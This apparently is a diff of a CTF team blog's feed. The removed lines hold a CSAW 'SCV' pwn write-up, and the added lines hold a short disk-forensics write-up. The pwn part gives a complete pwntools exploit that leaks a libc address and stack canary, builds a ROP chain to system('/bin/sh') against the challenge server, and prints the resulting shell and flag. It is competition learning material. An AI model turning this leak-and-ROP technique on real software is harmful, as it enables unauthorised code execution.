addresses</span></div><div class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">r.sendline(<span class="string">'1'</span>)</div><div class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">r.sendline(padding3)</div><div class="line"></div><div class="line"><span class="comment"># exiting</span></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">r.sendline(<span class="string">'3'</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'[*]BYE ~ TIME TO MINE MIENRALS...'</span>)</div><div class="line">r.interactive()</div><div class="line"><span class="comment">#time.sleep(10)</span></div><div class="line">r.close()</div></pre></td></tr></table></figure>
-<p>The full exploit:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'./scv'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">'./libc-2.23.so'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'pwn.chal.csaw.io'</span>, <span class="number">3764</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">readAddressFromTheStack</span><span class="params">(size, bytes_to_read, offset=<span class="number">0</span>)</span>:</span></div><div class="line">	<span class="string">"""</span></div><div class="line"><span class="string">    Args:</span></div><div class="line"><span class="string">        size (int): number of characters to send to the stack.</span></div><div class="line"><span class="string">        bytes_to_read (int): number of bytes to read from the stack we want to leak.</span></div><div class="line"><span class="string">		offset (int): number to subtract if we want to adjust the leaked address. (Optional)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    Returns:</span></div><div class="line"><span class="string">        int: returns an address leaked from the stack.</span></div><div class="line"><span class="string">	"""</span></div><div class="line">	</div><div class="line">	<span class="comment"># Write a certain number of bytes to leak LIBC</span></div><div class="line">	r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'1'</span>)</div><div class="line">	r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'A'</span>*size)</div><div class="line"></div><div class="line">	<span class="comment"># Read from the stack</span></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'2'</span>)</div><div class="line">	r.recvuntil(<span class="string">'[*]PLEASE TREAT HIM WELL.....'</span>)</div><div class="line">	r.recvline()</div><div class="line">	r.recvline()</div><div class="line">	r.recv(size)</div><div class="line">	<span class="keyword">return</span> u64(r.recv(bytes_to_read).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))-offset</div><div class="line">	</div><div class="line"> </div><div class="line">local = <span class="keyword">False</span></div><div class="line">binary = ELF(<span class="string">'./scv'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</div><div class="line"></div><div class="line">r = getConn()</div><div class="line"><span class="comment"># b *0x00400aae</span></div><div class="line"><span class="comment">#gdb.attach(r, '''</span></div><div class="line"><span class="comment">#b *0x00400cce</span></div><div class="line"><span class="comment">#b *0x00400cd3</span></div><div class="line"><span class="comment">#b *0x00400ddf</span></div><div class="line"><span class="comment">#b *0x00400d94</span></div><div class="line"><span class="comment">#b *0x400d8f</span></div><div class="line"><span class="comment">#b *0x00400dce</span></div><div class="line"><span class="comment">#c''')</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Get a libc address from the stack</span></div><div class="line">LEAKED = readAddressFromTheStack(<span class="number">40</span>, <span class="number">6</span>, <span class="number">-0x8f</span>)</div><div class="line">SYSTEM = LEAKED + <span class="number">0xb0f7</span></div><div class="line">LIBCBASE = SYSTEM -libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH_OFFSET = <span class="number">0x18cd17</span> <span class="comment"># strings -a -t x libc-2.23.so | grep '/bin/sh'</span></div><div class="line">BINSH = LIBCBASE + BINSH_OFFSET</div><div class="line">POPRET = <span class="number">0x0000000000400ea3</span> <span class="comment"># ROPgadget --binary ./scv --only "pop|ret"</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LEAKED LIBC 0x%x"</span> % LEAKED)</div><div class="line">log.info(<span class="string">"SYSTEM LIBC 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"LIBCBASE LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"BINSH ADDRESS 0x%x"</span> % BINSH)</div><div class="line"></div><div class="line">r.recv(<span class="number">1</span>) <span class="comment"># new line</span></div><div class="line"></div><div class="line"><span class="comment"># leak STACK CANARY</span></div><div class="line">STACK_CANARY = readAddressFromTheStack(<span class="number">40</span>+<span class="number">8</span>*<span class="number">16</span>, <span class="number">8</span>, <span class="number">0x0A</span>)</div><div class="line"></div><div class="line">log.info(<span class="string">"STACK CANARY 0x%x"</span> % STACK_CANARY)</div><div class="line"></div><div class="line">ROPCHAIN = <span class="string">''</span></div><div class="line">ROPCHAIN += p64(POPRET)</div><div class="line">ROPCHAIN += p64(BINSH)</div><div class="line">ROPCHAIN += p64(SYSTEM)</div><div class="line"></div><div class="line">padding3 = <span class="string">'A'</span>*(<span class="number">40</span>+<span class="number">8</span>*<span class="number">16</span>)+p64(STACK_CANARY)+ <span class="string">'AAAAAAAA'</span> + ROPCHAIN</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#rewrite old addresses</span></div><div class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">r.sendline(<span class="string">'1'</span>)</div><div class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">r.sendline(padding3)</div><div class="line"></div><div class="line"><span class="comment"># exiting</span></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">r.sendline(<span class="string">'3'</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'[*]BYE ~ TIME TO MINE MIENRALS...'</span>)</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
-<p>Running it and get the flag:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">$ python scv.py</div><div class="line">[*] <span class="string">'~/ctf/csaw/pwn/scv/scv'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[*] <span class="string">'~/ctf/csaw/pwn/scv/libc-2.23.so'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">[+] Opening connection to pwn.chal.csaw.io on port 3764: Done</div><div class="line">-------------------------</div><div class="line">[*]SCV GOOD TO GO,SIR....</div><div class="line">-------------------------</div><div class="line">1.FEED SCV....</div><div class="line">2.REVIEW THE FOOD....</div><div class="line">3.MINE MINERALS....</div><div class="line">-------------------------</div><div class="line">&gt;&gt;</div><div class="line">[*] LEAKED LIBC 0x7fe343297299</div><div class="line">[*] SYSTEM LIBC 0x7fe3432a2390</div><div class="line">[*] LIBCBASE LIBC 0x7fe34325d000</div><div class="line">[*] BINSH ADDRESS 0x7fe3433e9d17</div><div class="line">-------------------------</div><div class="line">[*]SCV GOOD TO GO,SIR....</div><div class="line">-------------------------</div><div class="line">1.FEED SCV....</div><div class="line">2.REVIEW THE FOOD....</div><div class="line">3.MINE MINERALS....</div><div class="line">-------------------------</div><div class="line">&gt;&gt;</div><div class="line">[*] STACK CANARY 0x49b1940e5e5ffe00</div><div class="line">-------------------------</div><div class="line">[*]SCV GOOD TO GO,SIR....</div><div class="line">-------------------------</div><div class="line">1.FEED SCV....</div><div class="line">2.REVIEW THE FOOD....</div><div class="line">3.MINE MINERALS....</div><div class="line">-------------------------</div><div class="line">&gt;&gt;</div><div class="line">[*]BYE ~ TIME TO MINE MIENRALS...</div><div class="line">[*] Switching to interactive mode</div><div class="line"></div><div class="line">$ ls</div><div class="line">flag</div><div class="line">scv</div><div class="line">$ cat flag</div><div class="line">flag&#123;sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11&#125;</div></pre></td></tr></table></figure>]]></content>
+<p>Forensics challenge we have an img with 16GB, and an online service at <a href="http://forensics.chal.csaw.io:3287" target="_blank" rel="external">http://forensics.chal.csaw.io:3287</a>, the service asks for a username and a password so we guessed we need to find them in the img, so lets use autopsy to search in the linux filesystem for filenames that contain the word flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/WBkVL6L.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/WBkVL6L.png" alt=""><br></a></p>
+<p>As we can see we can found a <code>/var/www/flag.txt</code> unfortunately the file is empty, but we have the files of the web service of the link provided!<br><a data-fancybox="gallery" href="https://i.imgur.com/21qqjhh.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/21qqjhh.png" alt=""><br></a></p>
+<p>Checking the username.txt and password.txt we can see that we have the username and password!<br><a data-fancybox="gallery" href="https://i.imgur.com/xCDzRDG.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/xCDzRDG.png" alt=""><br></a><br><a data-fancybox="gallery" href="https://i.imgur.com/ur0yCl6.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/ur0yCl6.png" alt=""><br></a></p>
+<p>After using the credentials on the web page we got the flag!<br><a data-fancybox="gallery" href="https://i.imgur.com/b46URKw.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/b46URKw.png" alt=""><br></a></p>
+]]></content>
     
     <summary type="html">
     
-      &lt;blockquote&gt;&lt;br&gt;SCV&lt;br&gt;&lt;br&gt;SCV is too hungry to mine the minerals. Can you give him some food?&lt;br&gt;&lt;br&gt;nc pwn.chal.csaw.io 3764&lt;br&gt;&lt;br&gt;&lt;/bloc
+      &lt;blockquote&gt;&lt;br&gt;    Best Router&lt;br&gt;    &lt;a href=&quot;http://forensics.chal.csaw.io:3287&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://forensics.chal.csa
     
     </summary>
     
-      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
+      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
     
     
       <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
-      <category term="stackcanary" scheme="https://teamrocketist.github.io/tags/stackcanary/"/>
+      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
     
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
+      <category term="partitions" scheme="https://teamrocketist.github.io/tags/partitions/"/>
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+      <category term="disk" scheme="https://teamrocketist.github.io/tags/disk/"/>
+    
+      <category term="autopsy" scheme="https://teamrocketist.github.io/tags/autopsy/"/>
     
   </entry>
   
